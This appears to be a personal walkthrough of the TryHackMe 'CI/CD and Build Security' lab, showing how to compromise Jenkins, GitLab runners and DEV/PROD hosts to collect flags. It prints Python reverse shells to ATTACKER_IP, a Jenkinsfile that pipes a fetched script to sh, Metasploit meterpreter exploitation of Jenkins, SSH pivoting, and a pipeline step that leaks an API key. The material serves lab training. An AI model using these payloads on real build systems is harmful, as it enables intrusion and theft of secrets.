# [CI/CD and Build Security](https://tryhackme.com/room/cicdandbuildsecurity)

* Register to **mother** from the AttackBox:
```shell
ssh mother@10.200.6.250
(password is `motherknowsbest`)

Please make a selection:
[1] Register
[2] Authenticate
[3] Exit
Selection:1
Please provide your THM username: myuser

=======================================
Thank you for checking-in with Mother for the CI/CD Network. Be careful, the are hostiles and androids about!
Please take note of the following details and please make sure to save them, as they will not be displayed again.
=======================================
Username: myuser
Password: xxxxxxxxxxxxxxxx
MailAddr: myuser@tryhackme.loc
IP Range: 10.200.6.0/24
=======================================
```
* Add hostnames:
```shell
sudo echo 10.200.6.150 gitlab.tryhackme.loc >> /etc/hosts
sudo echo 10.200.6.160 jenkins.tryhackme.loc >> /etc/hosts
```

## Task 6: Securing the Build Process

**Prepare attacker machine**

⚠️ AttackBox is suposed to be visible from **Jenkins** but sometimes it is not, so the alternative is to do it locally connected to the CI/CD VPN (see Task 2: Setting up)

* Create `shell.sh` (replacing `ATTACKER_IP`):
```shell
/usr/bin/python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("ATTACKER_IP",8081)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
```
* Execute the web server in the same directory you placed `shell.sh`:
```shell
python3 -m http.server 8080
```
* Execute the listener:
```shell
nc -lvp 8081
```

**Run Jenkins job to get a reverse shell**

* Go to http://gitlab.tryhackme.loc
* Register
* Go to http://gitlab.tryhackme.loc/ash/Merge-Test
* Fork
* Edit `Jenkinsfile` (replacing `ATTACKER_IP`):
```
pipeline {
  agent any
  stages {
    stage('build') {
      steps {
	    sh 'curl http://ATTACKER_IP:8080/shell.sh | sh'
	  }
    }
  }
}
```
* Commit changes
* Create merge request from your branch into ash/Merge-Test main branch
* You can go to http://jenkins.tryhackme.loc:8080 to see the job execution (user `jenkins` and password `jenkins`)
* You can repeat the steps just creating a new branch and starting over

Once you have the reverse shell you can continue to next section.

**Authenticate to Mother and follow the process to claim Flag 1. What is Flag 1?**

* Submit proof of compromise to **mother** from the AttackBox:
```shell
ssh mother@10.200.6.250
(password is `motherknowsbest`)

Please make a selection:
[1] Register
[2] Authenticate
[3] Exit
Selection:2
Please provide your username: myuser
Please provide your password: xxxxxxxxxxxxxxxx

Welcome myuser

What would you like to do?
Please select an option
[1] Submit proof of compromise
[2] Verify past compromises
[3] Exit
Selection:1
Please select which flag you would like to submit proof for:
[1]	Build Process Compromise
[2]	Build Server Compromise
[3]	Build Pipeline Compromise
[4]	DEV Environment Compromise
[5]	PROD Environment Compromise
[100]	Exit
Selection:1
Please provide the hostname of the host you have compromised (please use the name provided in your network diagram): JAgent

In order to verify your access, please complete the following steps.
1. On the jagent host, navigate to the /flag/ directory
2. Create a text file with this name: myuser.txt
3. Add the following UUID to the first line of the file: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
4. Click proceed for the verification to occur

Once you have performed the steps, please enter Y to verify your access.
If you wish to fully exit verification and try again please, please enter X.
If you wish to remove this verification attempt, please enter Z
Ready to verify? [Y/X/Z]:
```
* Execute the steps in **JAgent** using the reverse shell:
```shell
echo xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx > /flag/myuser.txt
```
* Back to **mother** proceed with the verification:
```shell
Ready to verify? [Y/X/Z]: Y

Congratulations! You have received the flag for: Build Process Compromise

Your flag value is: THM{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}
```

## Task 7: Securing the Build Server

**Authenticate to Mother and follow the process to claim Flag 2. What is Flag 2?**

* Run the exploit using **Metasploit**:
```shell
msfconsole

use exploit/multi/http/jenkins_script_console
set target 1
set payload linux/x64/meterpreter/bind_tcp
set password jenkins
set username jenkins
set RHOST jenkins.tryhackme.loc
set targeturi /
set rport 8080
run

[*] Checking access to the script console
[*] Logging in...
[*] Using CSRF token: 'xxxx' (Jenkins-Crumb style v2)
[*] x.x.x.x:8080 - Sending Linux stager...
[*] Command Stager progress - 100.00% done (751/751 bytes)
[*] Started bind TCP handler against x.x.x.x:4444
[*] Sending stage (3045380 bytes) to x.x.x.x
[*] Meterpreter session 1 opened (x.x.x.x:41949 -> x.x.x.x:4444) at 2025-05-03 19:44:11 +0100

meterpreter > getuid
Server username: jenkins
```
* Submit proof of compromise to **mother** from the AttackBox:
```shell
ssh mother@10.200.6.250
(password is `motherknowsbest`)

Please select an option
[1] Submit proof of compromise
[2] Verify past compromises
[3] Exit
Selection:1
Please select which flag you would like to submit proof for:
[1]	Build Process Compromise
[2]	Build Server Compromise
[3]	Build Pipeline Compromise
[4]	DEV Environment Compromise
[5]	PROD Environment Compromise
[100]	Exit
Selection:2
Please provide the hostname of the host you have compromised (please use the name provided in your network diagram): Jenkins

In order to verify your access, please complete the following steps.
1. On the jenkins host, navigate to the /flag/ directory
2. Create a text file with this name: myuser.txt
3. Add the following UUID to the first line of the file: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
4. Click proceed for the verification to occur

Once you have performed the steps, please enter Y to verify your access.
If you wish to fully exit verification and try again please, please enter X.
If you wish to remove this verification attempt, please enter Z
Ready to verify? [Y/X/Z]:
```
* Do the required steps back to **msfconsole**:
```shell
meterpreter > edit /flag/myuser.txt
(paste xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx)
```
* Back to **mother** proceed with the verification:
```shell
Ready to verify? [Y/X/Z]: Y

Congratulations! You have received the flag for: Build Server Compromise

Your flag value is: THM{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}
```

## Task 8: Securing the Build Pipeline

**Prepare attacker machine**

⚠️ AttackBox is suposed to be visible from **Gitlab runners** but sometimes it is not, so the alternative is to do it locally connected to the CI/CD VPN (see Task 2: Setting up)

* Execute the listener:
```shell
nc -lvp 8081
```

**Run Gitlab job to get a reverse shell**

* Go to http://gitlab.tryhackme.loc
* Log in as `anatacker` (password `Password1@`)
* Go to http://gitlab.tryhackme.loc/ash/approval-test
* Edit `.gitlab-ci.yml` (replacing `ATTACKER_IP`):
```yaml
stages:
  - deploy

production:
  stage: deploy
  script:
    - /usr/bin/python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("ATTACKER_IP",8081)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
  environment:
    name: ${CI_JOB_NAME}
```
* Commit changes and create merge request

**Get reverse shell**

* Get hostname on the reverse shell:
```shell
$ whoami
gitlab-runner
$ hostname
ip-10-200-6-201
```
* In this case `ip-10-200-6-201` is `GRunner01`

**Authenticate to Mother and follow the process to claim Flag 3. What is Flag 3?**

* Submit proof of compromise to **mother** from the AttackBox:
```shell
ssh mother@10.200.6.250
(password is `motherknowsbest`)

Please make a selection:
[1] Register
[2] Authenticate
[3] Exit
Selection:2
Please provide your username: myuser
Please provide your password: xxxxxxxxxxxxxxxx

Welcome myuser

What would you like to do?
Please select an option
[1] Submit proof of compromise
[2] Verify past compromises
[3] Exit
Selection:1
Please select which flag you would like to submit proof for:
[1]	Build Process Compromise
[2]	Build Server Compromise
[3]	Build Pipeline Compromise
[4]	DEV Environment Compromise
[5]	PROD Environment Compromise
[100]	Exit
Selection:3
Please provide the hostname of the host you have compromised (please use the name provided in your network diagram): GRunner01

In order to verify your access, please complete the following steps.
1. On the grunner01 host, navigate to the /flag/ directory
2. Create a text file with this name: myuser.txt
3. Add the following UUID to the first line of the file: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
4. Click proceed for the verification to occur

Once you have performed the steps, please enter Y to verify your access.
If you wish to fully exit verification and try again please, please enter X.
If you wish to remove this verification attempt, please enter Z
Ready to verify? [Y/X/Z]:
```
* Execute the steps in **GRunner01** using the reverse shell:
```shell
echo xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx > /flag/myuser.txt
```
* Back to **mother** proceed with the verification:
```shell
Ready to verify? [Y/X/Z]: Y

Congratulations! You have received the flag for: Build Pipeline Compromise

Your flag value is: THM{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}
```

## Task 9: Securing the Build Pipeline

**Prepare attacker machine**

⚠️ AttackBox is suposed to be visible from **Gitlab runners** but sometimes it is not, so the alternative is to do it locally connected to the CI/CD VPN (see Task 2: Setting up)

* Execute the listener:
```shell
nc -lvp 8081
```

**Run Gitlab job to get a reverse shell**

* Go to http://gitlab.tryhackme.loc
* Log in as `anatacker` (password `Password1@`)
* Go to http://gitlab.tryhackme.loc/ash/environments
* Change to **dev** branch
* Edit `.gitlab-ci.yml` (replacing `ATTACKER_IP`):
```yaml
stages:
  - deploy

production:
  stage: deploy
  script:
    - /usr/bin/python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("ATTACKER_IP",8081)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
  environment:
    name: ${CI_JOB_NAME}
```
* Commit changes and create merge request

**Get reverse shell**

* Get hostname on the reverse shell:
```shell
$ whoami
gitlab-runner
$ hostname
ip-10-200-6-202
```
* In this case `ip-10-200-6-202` is `GRunner02`
* Try connectivity to **DEV** and **PROD**:
```shell
$ nc -z -v 10.200.6.220 22
Connection to 10.200.6.220 22 port [tcp/ssh] succeeded!
$ nc -z -v 10.200.6.230 22
Connection to 10.200.6.230 22 port [tcp/ssh] succeeded!
```

**Authenticate to Mother and follow the process to claim Flag 4 from the DEV environment. What is Flag 4?**

* Submit proof of compromise to **mother** from the AttackBox:
```shell
ssh mother@10.200.6.250
(password is `motherknowsbest`)

Please make a selection:
[1] Register
[2] Authenticate
[3] Exit
Selection:2
Please provide your username: myuser
Please provide your password: xxxxxxxxxxxxxxxx

Welcome myuser

What would you like to do?
Please select an option
[1] Submit proof of compromise
[2] Verify past compromises
[3] Exit
Selection:1
Please select which flag you would like to submit proof for:
[1]	Build Process Compromise
[2]	Build Server Compromise
[3]	Build Pipeline Compromise
[4]	DEV Environment Compromise
[5]	PROD Environment Compromise
[100]	Exit
Selection:4
Please provide the hostname of the host you have compromised (please use the name provided in your network diagram): DEV

In order to verify your access, please complete the following steps.
1. On the dev host, navigate to the /flag/ directory
2. Create a text file with this name: myuser.txt
3. Add the following UUID to the first line of the file: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
4. Click proceed for the verification to occur

Once you have performed the steps, please enter Y to verify your access.
If you wish to fully exit verification and try again please, please enter X.
If you wish to remove this verification attempt, please enter Z
Ready to verify? [Y/X/Z]:
```
* Execute the steps in **GRunner02** using the reverse shell:
```shell
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null 10.200.6.220
echo xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx > /flag/myuser.txt
```
* Back to **mother** proceed with the verification:
```shell
Ready to verify? [Y/X/Z]: Y

Congratulations! You have received the flag for: DEV Environment Compromise

Your flag value is: THM{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}
```

**Authenticate to Mother and follow the process to claim Flag 5 from the PROD environment. What is Flag 5?**

* Submit proof of compromise to **mother** from the AttackBox:
```shell
ssh mother@10.200.6.250
(password is `motherknowsbest`)

Please make a selection:
[1] Register
[2] Authenticate
[3] Exit
Selection:2
Please provide your username: myuser
Please provide your password: xxxxxxxxxxxxxxxx

Welcome myuser

What would you like to do?
Please select an option
[1] Submit proof of compromise
[2] Verify past compromises
[3] Exit
Selection:1
Please select which flag you would like to submit proof for:
[1]	Build Process Compromise
[2]	Build Server Compromise
[3]	Build Pipeline Compromise
[4]	DEV Environment Compromise
[5]	PROD Environment Compromise
[100]	Exit
Selection:5
Please provide the hostname of the host you have compromised (please use the name provided in your network diagram): PROD

In order to verify your access, please complete the following steps.
1. On the dev host, navigate to the /flag/ directory
2. Create a text file with this name: myuser.txt
3. Add the following UUID to the first line of the file: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
4. Click proceed for the verification to occur

Once you have performed the steps, please enter Y to verify your access.
If you wish to fully exit verification and try again please, please enter X.
If you wish to remove this verification attempt, please enter Z
Ready to verify? [Y/X/Z]:
```
* Execute the steps in **GRunner02** using the reverse shell:
```shell
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ubuntu@10.200.6.230
echo xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx > /flag/myuser.txt
```
* Back to **mother** proceed with the verification:
```shell
Ready to verify? [Y/X/Z]: Y

Congratulations! You have received the flag for: PROD Environment Compromise

Your flag value is: THM{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}
```

## Task 10: Securing the Build Secrets

**What is the value of the PROD API_KEY?**

* Go to http://gitlab.tryhackme.loc
* Log in as `anatacker` (password `Password1@`)
* Go to http://gitlab.tryhackme.loc/ash/environments
* Change to **dev** branch
* Edit `.gitlab-ci.yml`:
```yaml
stages:
  - deploy

production:
  stage: deploy
  script:
    - echo "API_KEY is ${API_KEY}"
  environment:
    name: ${CI_JOB_NAME}
```
* Commit changes and create merge request
* Go to the pipeline "production" and check logs:
```text
$ echo "API_KEY is ${API_KEY}"
API_KEY is ***{*******.***.*****.**.**.****.******}
```
